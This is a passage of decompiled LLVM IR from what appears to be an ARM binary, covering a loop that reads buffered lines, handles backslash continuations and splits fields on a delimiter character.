  br i1 %v2_14298, label %dec_label_pc_145a8, label %dec_label_pc_142b0

dec_label_pc_142b0:                               ; preds = %dec_label_pc_14294
  %v1_142b0 = urem i32 %arg3, 256
  store i32 %v1_142b0, i32* @sb, align 4
  %v1_142b4 = udiv i32 %arg3, 256
  %v3_142b8 = urem i32 %v1_142b4, 256
  %v3_142bc = mul nuw nsw i32 %v1_142b0, 4
  %v1_142c4 = or i32 %v3_142bc, 1
  %v1_142d0 = and i32 %arg3, 131072
  %v1_142d4 = add nsw i32 %v1_142b0, -1
  %v1_142e0 = and i32 %arg3, 262144
  store i32 %v1_142e0, i32* %r2.global-to-local, align 4
  %v1_142e4 = and i32 %arg3, 65536
  store i32 %v1_142e4, i32* %r3.global-to-local, align 4
  store i32 %v1_142e4, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_142f4 = add i32 %arg4, 1
  store i32 %v1_142f4, i32* @sl, align 4
  %v2_14474 = inttoptr i32 %arg2 to i32*
  %v2_14484 = icmp eq i32 %v1_142d0, 0
  %v2_144dc = icmp eq i32 %v1_142e0, 0
  br label %dec_label_pc_142f8

dec_label_pc_142f8:                               ; preds = %dec_label_pc_142f8.backedge, %dec_label_pc_142b0
  %v2_14314 = phi i32 [ %v0_142f8.pre, %dec_label_pc_142f8.backedge ], [ %tmp, %dec_label_pc_142b0 ]
  %v1_142f8 = add i32 %v2_14314, 4
  %v2_142f8 = inttoptr i32 %v1_142f8 to i32*
  %v3_142f8 = load i32, i32* %v2_142f8, align 4
  store i32 %v3_142f8, i32* %r3.global-to-local, align 4
  %v2_142fc = icmp eq i32 %v3_142f8, 0
  store i1 %v2_142fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142fc, label %dec_label_pc_14304, label %dec_label_pc_1434c

dec_label_pc_14304:                               ; preds = %dec_label_pc_142f8
  %v1_14304 = add i32 %v2_14314, 16
  %v2_14304 = inttoptr i32 %v1_14304 to i32*
  %v3_14304 = load i32, i32* %v2_14304, align 4
  store i32 %v3_14304, i32* %r3.global-to-local, align 4
  %v2_14308 = icmp eq i32 %v3_14304, 0
  store i1 %v2_14308, i1* %cpsr_z.global-to-local, align 1
  %v1_1430c = add i32 %v2_14314, 8
  %v2_1430c = inttoptr i32 %v1_1430c to i32*
  %v3_1430c = load i32, i32* %v2_1430c, align 4
  store i32 %v3_1430c, i32* %r3.global-to-local, align 4
  br i1 %v2_14308, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_14304
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_14304, align 4
  %v0_14318.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_14304, %bb
  %v0_14318 = phi i32 [ %v0_14318.pre, %bb ], [ %v3_1430c, %dec_label_pc_14304 ]
  %v2_14318 = icmp eq i32 %v0_14318, 0
  store i1 %v2_14318, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14318, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_142c4, i32* %r3.global-to-local, align 4
  %v2_14320 = load i32, i32* @r5, align 4
  %v3_14320 = add i32 %v2_14320, 8
  %v4_14320 = inttoptr i32 %v3_14320 to i32*
  store i32 %v1_142c4, i32* %v4_14320, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_14324 = load i32, i32* @r5, align 4
  %v1_14324 = add i32 %v0_14324, 16
  %v2_14324 = inttoptr i32 %v1_14324 to i32*
  %v3_14324 = load i32, i32* %v2_14324, align 4
  store i32 %v3_14324, i32* %r0.global-to-local, align 4
  %v1_14328 = add i32 %v0_14324, 8
  %v2_14328 = inttoptr i32 %v1_14328 to i32*
  %v3_14328 = load i32, i32* %v2_14328, align 4
  store i32 %v3_14328, i32* %r3.global-to-local, align 4
  %v2_1432c = add i32 %v3_14328, %v3_14324
  store i32 %v2_1432c, i32* @r0, align 4
  %v0_14330 = call i32 @function_1183c()
  store i32 %v0_14330, i32* %r0.global-to-local, align 4
  %v2_14334 = icmp eq i32 %v0_14330, 0
  store i1 %v2_14334, i1* %cpsr_z.global-to-local, align 1
  %v1_14338 = load i32, i32* @r5, align 4
  %v2_14338 = add i32 %v1_14338, 4
  %v3_14338 = inttoptr i32 %v2_14338 to i32*
  store i32 %v0_14330, i32* %v3_14338, align 4
  br i1 %v2_14334, label %dec_label_pc_145a8, label %dec_label_pc_14340

dec_label_pc_14340:                               ; preds = %.thread
  %v0_14340 = load i32, i32* @r5, align 4
  %v1_14340 = add i32 %v0_14340, 20
  %v2_14340 = inttoptr i32 %v1_14340 to i32*
  %v3_14340 = load i32, i32* %v2_14340, align 4
  %v1_14344 = or i32 %v3_14340, 1
  store i32 %v1_14344, i32* %r3.global-to-local, align 4
  store i32 %v1_14344, i32* %v2_14340, align 4
  %v0_1434c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1434c

dec_label_pc_1434c:                               ; preds = %dec_label_pc_142f8, %dec_label_pc_14340
  %v1_14354 = phi i32 [ %v2_14314, %dec_label_pc_142f8 ], [ %v0_1434c.pre, %dec_label_pc_14340 ]
  %v1_1434c = add i32 %v1_14354, 4
  %v2_1434c = inttoptr i32 %v1_1434c to i32*
  %v3_1434c = load i32, i32* %v2_1434c, align 4
  store i32 %v3_1434c, i32* %r2.global-to-local, align 4
  %v4_1434c = add i32 %v1_14354, 8
  %v5_1434c = inttoptr i32 %v4_1434c to i32*
  %v6_1434c = load i32, i32* %v5_1434c, align 4
  %v2_14350 = add i32 %v6_1434c, %v3_1434c
  store i32 %v2_14350, i32* %r3.global-to-local, align 4
  %v2_14354 = add i32 %v1_14354, 12
  %v3_14354 = inttoptr i32 %v2_14354 to i32*
  store i32 %v2_14350, i32* %v3_14354, align 4
  %v0_14358 = load i32, i32* @fp, align 4
  store i32 %v0_14358, i32* @r6, align 4
  br label %dec_label_pc_1435c

dec_label_pc_1435c:                               ; preds = %dec_label_pc_143e8, %dec_label_pc_143d4, %dec_label_pc_1434c
  %v0_14364 = phi i32 [ %v0_14358, %dec_label_pc_1434c ], [ %v1_143d4, %dec_label_pc_143d4 ], [ %v0_14364.pre.pre, %dec_label_pc_143e8 ]
  %v0_1435c = load i32, i32* @r5, align 4
  %v1_1435c = add i32 %v0_1435c, 12
  store i32 %v1_1435c, i32* %r0.global-to-local, align 4
  %v1_14360 = inttoptr i32 %v1_1435c to i32*
  %v2_14360 = load i32, i32* %v1_14360, align 4
  store i32 %v2_14360, i32* %r0.global-to-local, align 4
  %v3_14360 = add i32 %v0_1435c, 16
  %v4_14360 = inttoptr i32 %v3_14360 to i32*
  %v5_14360 = load i32, i32* %v4_14360, align 4
  %v2_14364 = add i32 %v2_14360, %v0_14364
  store i32 %v2_14364, i32* %r0.global-to-local, align 4
  %v2_14368 = sub i32 %v5_14360, %v0_14364
  %v1_1436c = inttoptr i32 %v0_1435c to i32*
  %v2_1436c = load i32, i32* %v1_1436c, align 4
  store i32 %v2_1436c, i32* %r2.global-to-local, align 4
  %v3_14370 = call i32 @function_14d90(i32 %v2_14364, i32 %v2_14368, i32 %v2_1436c)
  store i32 %v3_14370, i32* %r0.global-to-local, align 4
  store i32 %v3_14370, i32* %r4.global-to-local, align 4
  %v2_14374 = icmp eq i32 %v3_14370, 0
  store i1 %v2_14374, i1* %cpsr_z.global-to-local, align 1
  %v0_1437c = load i32, i32* @r5, align 4
  %v1_1437c = add i32 %v0_1437c, 12
  br i1 %v2_14374, label %dec_label_pc_1437c, label %dec_label_pc_14394

dec_label_pc_1437c:                               ; preds = %dec_label_pc_1435c
  store i32 %v1_1437c, i32* %r0.global-to-local, align 4
  %v1_14380 = inttoptr i32 %v1_1437c to i32*
  %v2_14380 = load i32, i32* %v1_14380, align 4
  store i32 %v2_14380, i32* %r0.global-to-local, align 4
  %v3_14380 = add i32 %v0_1437c, 16
  %v4_14380 = inttoptr i32 %v3_14380 to i32*
  %v5_14380 = load i32, i32* %v4_14380, align 4
  store i32 %v5_14380, i32* @r2, align 4
  %v2_14388 = inttoptr i32 %v2_14380 to i8*
  %v3_14388 = call i32 @function_11260(i8* %v2_14388, i32 0)
  store i32 %v3_14388, i32* %r0.global-to-local, align 4
  %v0_1438c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_145ac

dec_label_pc_14394:                               ; preds = %dec_label_pc_1435c
  %v2_14394 = inttoptr i32 %v1_1437c to i32*
  %v3_14394 = load i32, i32* %v2_14394, align 4
  store i32 %v3_14394, i32* @r4, align 4
  %v1_14398 = load i32, i32* @r6, align 4
  %v2_14398 = add i32 %v1_14398, %v3_14394
  store i32 %v2_14398, i32* %r0.global-to-local, align 4
  %v1_1439c = call i32 @function_15840(i32 %v2_14398)
  %v0_143a4 = load i32, i32* @r6, align 4
  %v2_143a4 = add i32 %v0_143a4, %v1_1439c
  store i32 %v2_143a4, i32* @r6, align 4
  %v0_143a8 = load i32, i32* @r4, align 4
  store i32 %v0_143a8, i32* @r0, align 4
  %v2_143ac = call i32 @function_15a8c(i32 %v0_143a8, i32 10)
  store i32 %v2_143ac, i32* %r0.global-to-local, align 4
  %v2_143b0 = icmp eq i32 %v2_143ac, 0
  store i1 %v2_143b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143b0, label %dec_label_pc_143dc, label %dec_label_pc_143b8

dec_label_pc_143b8:                               ; preds = %dec_label_pc_14394
  %v1_143b8 = inttoptr i32 %v2_143ac to i8*
  %v2_143b8 = load i8, i8* %v1_143b8, align 1
  %v3_143b8 = zext i8 %v2_143b8 to i32
  %v1_143bc = add nuw nsw i32 %v3_143b8, 255
  %v1_143c0 = urem i32 %v1_143bc, 256
  store i32 %v1_143c0, i32* %r3.global-to-local, align 4
  %v7_143c4 = icmp eq i32 %v1_143c0, 92
  store i1 %v7_143c4, i1* %cpsr_z.global-to-local, align 1
  %v1_143c8 = trunc i32 %v1_143bc to i8
  store i8 %v1_143c8, i8* %v1_143b8, align 1
  %v0_143cc = load i32, i32* @r6, align 4
  %v1_143cc = add i32 %v0_143cc, -1
  store i32 %v1_143cc, i32* @r6, align 4
  %v0_143d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_143d0, label %dec_label_pc_143d4, label %dec_label_pc_14460

dec_label_pc_143d4:                               ; preds = %dec_label_pc_143b8
  %v1_143d4 = add i32 %v0_143cc, -2
  store i32 %v1_143d4, i32* @r6, align 4
  br label %dec_label_pc_1435c

dec_label_pc_143dc:                               ; preds = %dec_label_pc_14394
  %v0_143dc = load i32, i32* @r5, align 4
  %v1_143dc = add i32 %v0_143dc, 20
  %v2_143dc = inttoptr i32 %v1_143dc to i32*
  %v3_143dc = load i32, i32* %v2_143dc, align 4
  store i32 %v3_143dc, i32* %r3.global-to-local, align 4
  %v2_143e0 = icmp eq i32 %v3_143dc, 0
  store i1 %v2_143e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143e0, label %dec_label_pc_14418, label %dec_label_pc_143e8

dec_label_pc_143e8:                               ; preds = %dec_label_pc_143dc
  %v1_143e8 = add i32 %v0_143dc, 16
  %v2_143e8 = inttoptr i32 %v1_143e8 to i32*
  %v3_143e8 = load i32, i32* %v2_143e8, align 4
  store i32 %v3_143e8, i32* %r3.global-to-local, align 4
  %v1_143ec = add i32 %v0_143dc, 8
  %v2_143ec = inttoptr i32 %v1_143ec to i32*
  %v3_143ec = load i32, i32* %v2_143ec, align 4
  %v1_143f0 = add i32 %v3_143e8, 4096
  store i32 %v1_143f0, i32* %r3.global-to-local, align 4
  %v2_143f4 = add i32 %v3_143ec, %v1_143f0
  store i32 %v1_143f0, i32* %v2_143e8, align 4
  %v0_143fc = load i32, i32* @r5, align 4
  %v1_143fc = add i32 %v0_143fc, 4
  %v2_143fc = inttoptr i32 %v1_143fc to i32*
  %v3_143fc = load i32, i32* %v2_143fc, align 4
  store i32 %v3_143fc, i32* %r0.global-to-local, align 4
  %v4_14400 = inttoptr i32 %v3_143fc to i32*
  %v5_14400 = call i32 @function_12290(i32* %v4_14400, i32 %v2_143f4, i32 %v2_1436c, i32 %v1_143f0)
  store i32 %v5_14400, i32* %r0.global-to-local, align 4
  %v0_14404 = load i32, i32* @r5, align 4
  %v1_14404 = add i32 %v0_14404, 8
  %v2_14404 = inttoptr i32 %v1_14404 to i32*
  %v3_14404 = load i32, i32* %v2_14404, align 4
  %v2_14408 = add i32 %v3_14404, %v5_14400
  store i32 %v2_14408, i32* %r3.global-to-local, align 4
  %v2_1440c = add i32 %v0_14404, 12
  %v3_1440c = inttoptr i32 %v2_1440c to i32*
  store i32 %v2_14408, i32* %v3_1440c, align 4
  %v1_14410 = load i32, i32* @r5, align 4
  %v2_14410 = add i32 %v1_14410, 4
  %v3_14410 = inttoptr i32 %v2_14410 to i32*
  store i32 %v5_14400, i32* %v3_14410, align 4
  %v0_14364.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1435c

dec_label_pc_14418:                               ; preds = %dec_label_pc_143dc, %.dec_label_pc_14418_crit_edge
  %v0_14418 = phi i32 [ %v0_14418.pre, %.dec_label_pc_14418_crit_edge ], [ %v0_143dc, %dec_label_pc_143dc ]
  %v1_14418 = inttoptr i32 %v0_14418 to i32*
  %v2_14418 = load i32, i32* %v1_14418, align 4
  %v1_1441c = add i32 %v2_14418, 52
  %v2_1441c = inttoptr i32 %v1_1441c to i32*
  %v3_1441c = load i32, i32* %v2_1441c, align 4
  store i32 %v3_1441c, i32* %r3.global-to-local, align 4
  %v2_14420 = icmp eq i32 %v3_1441c, 0
  store i1 %v2_14420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14420, label %dec_label_pc_1444c, label %dec_label_pc_14428

dec_label_pc_14428:                               ; preds = %dec_label_pc_14418
  %v1_14428 = add i32 %v2_14418, 16
  %v2_14428 = inttoptr i32 %v1_14428 to i32*
  %v3_14428 = load i32, i32* %v2_14428, align 4
  store i32 %v3_14428, i32* %r2.global-to-local, align 4
  %v1_1442c = add i32 %v2_14418, 24
  %v2_1442c = inttoptr i32 %v1_1442c to i32*
  %v3_1442c = load i32, i32* %v2_1442c, align 4
  store i32 %v3_1442c, i32* %r3.global-to-local, align 4
  %v3_14430 = icmp ult i32 %v3_14428, %v3_1442c
  %v9_14430 = icmp eq i32 %v3_14428, %v3_1442c
  store i1 %v9_14430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14430, label %dec_label_pc_14454thread-pre-split, label %dec_label_pc_14440

dec_label_pc_14440:                               ; preds = %dec_label_pc_14428
  store i32 %v2_14418, i32* %r0.global-to-local, align 4
  %v1_14444 = inttoptr i32 %v2_14418 to i16*
  %v2_14444 = call i32 @function_151e0(i16* %v1_14444)
  store i32 %v2_14444, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14454

dec_label_pc_1444c:                               ; preds = %dec_label_pc_14418
  store i32 %v2_14418, i32* %r0.global-to-local, align 4
  %v1_14450 = call i32 @function_14cb4(i32 %v2_14418)
  store i32 %v1_14450, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14454

dec_label_pc_14454thread-pre-split:               ; preds = %dec_label_pc_14428
  %v2_14434 = inttoptr i32 %v3_14428 to i8*
  %v3_14434 = load i8, i8* %v2_14434, align 1
  %v4_14434 = zext i8 %v3_14434 to i32
  store i32 %v4_14434, i32* %r0.global-to-local, align 4
  %v6_14434 = add i32 %v3_14428, 1
  store i32 %v6_14434, i32* %r2.global-to-local, align 4
  store i32 %v6_14434, i32* %v2_14428, align 4
  %v0_14454.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14454

dec_label_pc_14454:                               ; preds = %dec_label_pc_14454thread-pre-split, %dec_label_pc_14440, %dec_label_pc_1444c
  %v1_14458 = phi i32 [ %v0_14454.pr, %dec_label_pc_14454thread-pre-split ], [ %v2_14444, %dec_label_pc_14440 ], [ %v1_14450, %dec_label_pc_1444c ]
  %v7_14454 = icmp eq i32 %v1_14458, 10
  store i1 %v7_14454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14454, label %dec_label_pc_14460.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_14454
  %v8_14458 = icmp eq i32 %v1_14458, -1
  store i1 %v8_14458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_14458, label %dec_label_pc_14460.loopexit, label %.dec_label_pc_14418_crit_edge

.dec_label_pc_14418_crit_edge:                    ; preds = %bb68
  %v0_14418.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14418

dec_label_pc_14460.loopexit:                      ; preds = %bb68, %dec_label_pc_14454
  %v0_14460.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14460

dec_label_pc_14460:                               ; preds = %dec_label_pc_143b8, %dec_label_pc_14460.loopexit
  %v0_14460 = phi i32 [ %v0_14460.pre, %dec_label_pc_14460.loopexit ], [ %v1_143cc, %dec_label_pc_143b8 ]
  %v7_14460 = icmp eq i32 %v0_14460, -1
  store i1 %v7_14460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14460, label %dec_label_pc_145a8, label %dec_label_pc_14468

dec_label_pc_14468:                               ; preds = %dec_label_pc_14460
  %v0_14468 = load i32, i32* @r5, align 4
  %v1_14468 = add i32 %v0_14468, 4
  %v2_14468 = inttoptr i32 %v1_14468 to i32*
  %v3_14468 = load i32, i32* %v2_14468, align 4
  store i32 %v3_14468, i32* %r0.global-to-local, align 4
  store i32 %v3_142bc, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_14468, i32* %v2_14474, align 4
  %v0_14478 = load i32, i32* @fp, align 4
  %v2_1447c = inttoptr i32 %v3_14468 to i8*
  %v3_1447c = call i32 @function_11260(i8* %v2_1447c, i32 %v0_14478)
  store i32 %v3_1447c, i32* %r0.global-to-local, align 4
  store i32 %v1_142d0, i32* %r2.global-to-local, align 4
  store i1 %v2_14484, i1* %cpsr_z.global-to-local, align 1
  %v0_14488 = load i32, i32* @r5, align 4
  %v1_14488 = add i32 %v0_14488, 12
  %v2_14488 = inttoptr i32 %v1_14488 to i32*
  %v3_14488 = load i32, i32* %v2_14488, align 4
  store i32 %v3_14488, i32* @r4, align 4
  br i1 %v2_14484, label %dec_label_pc_144a0, label %dec_label_pc_14490

dec_label_pc_14490:                               ; preds = %dec_label_pc_14468
  store i32 %v3_14488, i32* @r0, align 4
  %v0_14494 = load i32, i32* @sl, align 4
  %v2_14498 = inttoptr i32 %v3_14488 to i8*
  %v3_14498 = call i32 @function_15904(i8* %v2_14498, i32 %v0_14494)
  store i32 %v3_14498, i32* %r0.global-to-local, align 4
  %v0_1449c = load i32, i32* @r4, align 4
  %v2_1449c = add i32 %v0_1449c, %v3_14498
  store i32 %v2_1449c, i32* @r4, align 4
  br label %dec_label_pc_144a0

dec_label_pc_144a0:                               ; preds = %dec_label_pc_14468, %dec_label_pc_14490
  %v0_1457813 = phi i32 [ %v3_14488, %dec_label_pc_14468 ], [ %v2_1449c, %dec_label_pc_14490 ]
  %v1_144a0 = inttoptr i32 %v0_1457813 to i8*
  %v2_144a0 = load i8, i8* %v1_144a0, align 1
  %v3_144a0 = zext i8 %v2_144a0 to i32
  store i32 %v3_144a0, i32* %r2.global-to-local, align 4
  %v2_144a4 = icmp eq i8 %v2_144a0, 0
  store i1 %v2_144a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_144a4, label %dec_label_pc_142f8.backedge, label %dec_label_pc_144ac

dec_label_pc_144ac:                               ; preds = %dec_label_pc_144a0
  %v0_144ac = load i32, i32* @r7, align 4
  %v1_144ac = inttoptr i32 %v0_144ac to i8*
  %v2_144ac = load i8, i8* %v1_144ac, align 1
  %v3_144ac = zext i8 %v2_144ac to i32
  store i32 %v3_144ac, i32* %r3.global-to-local, align 4
  %v9_144b0 = icmp eq i8 %v2_144ac, %v2_144a0
  store i1 %v9_144b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_144b0, label %dec_label_pc_142f8.backedge, label %dec_label_pc_14578.preheader

dec_label_pc_14578.preheader:                     ; preds = %dec_label_pc_144ac
  %v1_144b4 = load i32, i32* @fp, align 4
  store i32 %v1_144b4, i32* @r6, align 4
  %v2_1457815 = load i8, i8* %v1_144a0, align 1
  %v3_1457816 = zext i8 %v2_1457815 to i32
  store i32 %v3_1457816, i32* %r2.global-to-local, align 4
  %v2_1457c17 = icmp eq i8 %v2_1457815, 0
  store i1 %v2_1457c17, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1457c17, label %dec_label_pc_14594, label %dec_label_pc_14584.preheader

dec_label_pc_14584.preheader:                     ; preds = %dec_label_pc_14578.preheader
  %v2_1458482 = load i8, i8* %v1_144ac, align 1
  %v3_1458483 = zext i8 %v2_1458482 to i32
  store i32 %v3_1458483, i32* %r3.global-to-local, align 4
  %v9_1458886 = icmp eq i8 %v2_1458482, %v2_1457815
  store i1 %v9_1458886, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1458886, label %dec_label_pc_14594, label %bb74

dec_label_pc_144c0:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_144c4 = load i32, i32* %v2_14474, align 4
  store i32 %v2_144c4, i32* %r3.global-to-local, align 4
  store i32 %v1_142d4, i32* %r2.global-to-local, align 4
  %v9_144cc = icmp eq i32 %v2_144d088, %v1_142d4
  store i1 %v9_144cc, i1* %cpsr_z.global-to-local, align 1
  %v5_144d0 = mul i32 %v2_144d088, 4
  %v6_144d0 = add i32 %v2_144c4, %v5_144d0
  %v7_144d0 = inttoptr i32 %v6_144d0 to i32*
  store i32 %v0_144d087, i32* %v7_144d0, align 4
  br i1 %v9_144cc, label %dec_label_pc_144d8, label %dec_label_pc_144e4

dec_label_pc_144d8:                               ; preds = %dec_label_pc_144c0
  store i32 %v1_142e0, i32* %r3.global-to-local, align 4
  store i1 %v2_144dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_144dc, label %dec_label_pc_144e4, label %dec_label_pc_14504

dec_label_pc_144e4:                               ; preds = %dec_label_pc_144d8, %dec_label_pc_144c0
  %v0_144e4 = load i32, i32* @r7, align 4
  %v1_144e4 = inttoptr i32 %v0_144e4 to i8*
  %v2_144e4 = load i8, i8* %v1_144e4, align 1
  %v3_144e4 = zext i8 %v2_144e4 to i32
  store i32 %v3_144e4, i32* %r3.global-to-local, align 4
  %v2_144e8 = icmp eq i8 %v2_144e4, 0
  store i1 %v2_144e8, i1* %cpsr_z.global-to-local, align 1
  %v0_144ec = load i32, i32* @r4, align 4
  store i32 %v0_144ec, i32* @r0, align 4
  %v1_144f0 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_144e8, i32 %v1_144f0, i32 %v0_144e4
  store i32 %storemerge, i32* @r1, align 4
  %v0_144f8 = call i32 @function_158c0()
  store i32 %v0_144f8, i32* %r0.global-to-local, align 4
  %v0_144fc = load i32, i32* @r4, align 4
  %v2_144fc = add i32 %v0_144fc, %v0_144f8
  store i32 %v2_144fc, i32* @r4, align 4
  br label %dec_label_pc_1453c

dec_label_pc_14504:                               ; preds = %dec_label_pc_144d8
  %v0_14504 = load i32, i32* @r4, align 4
  store i32 %v0_14504, i32* @r0, align 4
  %v0_14508 = load i32, i32* @r7, align 4
  %v1_14508 = inttoptr i32 %v0_14508 to i8*
  %v2_14508 = load i8, i8* %v1_14508, align 1
  %v3_14508 = zext i8 %v2_14508 to i32
  %v5_1450c = call i32 @function_159a0(i32 %v0_14504, i32 %v3_14508, i32 %v1_142d4, i32 %v1_142e0)
  store i32 %v5_1450c, i32* %r0.global-to-local, align 4
  store i32 %v1_142d0, i32* %r2.global-to-local, align 4
  store i1 %v2_14484, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_1450c, i32* @r4, align 4
  br i1 %v2_14484, label %dec_label_pc_1453c, label %dec_label_pc_14528

dec_label_pc_14524:                               ; preds = %dec_label_pc_14528
  %v1_14524 = add i32 %v0_1453c.pre, -1
  store i32 %v1_14524, i32* @r4, align 4
  br label %dec_label_pc_14528

dec_label_pc_14528:                               ; preds = %dec_label_pc_14504, %dec_label_pc_14524
  %v0_14528 = phi i32 [ %v1_14524, %dec_label_pc_14524 ], [ %v5_1450c, %dec_label_pc_14504 ]
  %v1_14528 = add i32 %v0_14528, -1
  %v2_14528 = inttoptr i32 %v1_14528 to i8*
  %v3_14528 = load i8, i8* %v2_14528, align 1
  %v4_14528 = zext i8 %v3_14528 to i32
  %v0_1452c = load i32, i32* @sl, align 4
  store i32 %v0_1452c, i32* @r0, align 4
  %v2_14530 = call i32 @function_15a8c(i32 %v0_1452c, i32 %v4_14528)
  store i32 %v2_14530, i32* %r0.global-to-local, align 4
  %v2_14534 = icmp eq i32 %v2_14530, 0
  store i1 %v2_14534, i1* %cpsr_z.global-to-local, align 1
  %v0_1453c.pre = load i32, i32* @r4, align 4
  br i1 %v2_14534, label %dec_label_pc_1453c, label %dec_label_pc_14524

dec_label_pc_1453c:                               ; preds = %dec_label_pc_14528, %dec_label_pc_14504, %dec_label_pc_144e4
  %v3_14548 = phi i32 [ %v5_1450c, %dec_label_pc_14504 ], [ %v2_144fc, %dec_label_pc_144e4 ], [ %v0_1453c.pre, %dec_label_pc_14528 ]
  %v1_1453c = inttoptr i32 %v3_14548 to i8*
  %v2_1453c = load i8, i8* %v1_1453c, align 1
  %v3_1453c = zext i8 %v2_1453c to i32
  store i32 %v3_1453c, i32* %r2.global-to-local, align 4
  %v0_14540 = load i32, i32* @r7, align 4
  %v1_14540 = inttoptr i32 %v0_14540 to i8*
  %v2_14540 = load i8, i8* %v1_14540, align 1
  %v3_14540 = zext i8 %v2_14540 to i32
  store i32 %v3_14540, i32* %r3.global-to-local, align 4
  %v9_14544 = icmp eq i8 %v2_14540, %v2_1453c
  store i1 %v9_14544, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14544, label %bb71, label %dec_label_pc_14550

bb71:                                             ; preds = %dec_label_pc_1453c
  %v1_14548 = load i32, i32* @fp, align 4
  %v2_14548 = trunc i32 %v1_14548 to i8
  store i8 %v2_14548, i8* %v1_1453c, align 1
  %v0_1454c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1454c.pr, label %bb73, label %.dec_label_pc_14550_crit_edge

.dec_label_pc_14550_crit_edge:                    ; preds = %bb71
  %v0_14550.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14550

dec_label_pc_14550:                               ; preds = %.dec_label_pc_14550_crit_edge, %dec_label_pc_1453c
  %v0_14550 = phi i32 [ %v0_14550.pre, %.dec_label_pc_14550_crit_edge ], [ %v3_1453c, %dec_label_pc_1453c ]
  %v2_14550 = icmp eq i32 %v0_14550, 0
  store i1 %v2_14550, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14550, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_14550
  %v1_14554 = load i32, i32* @fp, align 4
  %v2_14554 = trunc i32 %v1_14554 to i8
  %v3_14554 = load i32, i32* @r4, align 4
  %v4_14554 = inttoptr i32 %v3_14554 to i8*
  store i8 %v2_14554, i8* %v4_14554, align 1
  %v5_14554 = load i32, i32* @r4, align 4
  %v6_14554 = add i32 %v5_14554, 1
  store i32 %v6_14554, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_14550, %bb72
  %v2_14558 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_14558, i32* %r3.global-to-local, align 4
  %v2_1455c = icmp eq i32 %v2_14558, 0
  store i1 %v2_1455c, i1* %cpsr_z.global-to-local, align 1
  %v0_14578.pre = load i32, i32* @r4, align 4
  br i1 %v2_1455c, label %dec_label_pc_14574, label %dec_label_pc_14564

dec_label_pc_14564:                               ; preds = %bb73
  store i32 %v0_14578.pre, i32* @r0, align 4
  %v0_14568 = load i32, i32* @sl, align 4
  %v2_1456c = inttoptr i32 %v0_14578.pre to i8*
  %v3_1456c = call i32 @function_15904(i8* %v2_1456c, i32 %v0_14568)
  store i32 %v3_1456c, i32* %r0.global-to-local, align 4
  %v0_14570 = load i32, i32* @r4, align 4
  %v2_14570 = add i32 %v0_14570, %v3_1456c
  store i32 %v2_14570, i32* @r4, align 4
  br label %dec_label_pc_14574

dec_label_pc_14574:                               ; preds = %bb73, %dec_label_pc_14564
  %v0_14578 = phi i32 [ %v2_14570, %dec_label_pc_14564 ], [ %v0_14578.pre, %bb73 ]
  %v0_14574 = load i32, i32* @r6, align 4
  %v1_14574 = add i32 %v0_14574, 1
  store i32 %v1_14574, i32* @r6, align 4
  %v1_14578 = inttoptr i32 %v0_14578 to i8*
  %v2_14578 = load i8, i8* %v1_14578, align 1
  %v3_14578 = zext i8 %v2_14578 to i32
  store i32 %v3_14578, i32* %r2.global-to-local, align 4
  %v2_1457c = icmp eq i8 %v2_14578, 0
  store i1 %v2_1457c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1457c, label %dec_label_pc_14594, label %dec_label_pc_14574.dec_label_pc_14584_crit_edge

dec_label_pc_14574.dec_label_pc_14584_crit_edge:  ; preds = %dec_label_pc_14574
  %v0_14584.pre = load i32, i32* @r7, align 4
  %v1_14584 = inttoptr i32 %v0_14584.pre to i8*
  %v2_14584 = load i8, i8* %v1_14584, align 1
  %v3_14584 = zext i8 %v2_14584 to i32
  store i32 %v3_14584, i32* %r3.global-to-local, align 4
  %v9_14588 = icmp eq i8 %v2_14584, %v2_14578
  store i1 %v9_14588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14588, label %dec_label_pc_14594, label %bb74

bb74:                                             ; preds = %dec_label_pc_14584.preheader, %dec_label_pc_14574.dec_label_pc_14584_crit_edge
